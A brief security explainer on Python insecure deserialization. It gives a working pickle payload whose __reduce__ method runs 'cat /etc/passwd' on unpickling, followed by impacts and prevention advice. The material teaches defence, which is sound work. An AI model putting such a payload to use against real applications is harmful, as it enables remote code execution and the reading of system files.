How Insecure Deserialization Works

When applications deserialize untrusted data, attackers can inject malicious objects.

Python Pickle RCE Example:

import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

payload = pickle.dumps(RCE())
# When this is unpickled, it executes os.system!

Impact:

  • Remote Code Execution (RCE)
  • Server takeover
  • Data exfiltration
  • Privilege escalation

Prevention:

  • Never use pickle on untrusted data
  • Use safe formats like JSON
  • Validate and sign serialized data
  • Implement strict type checking
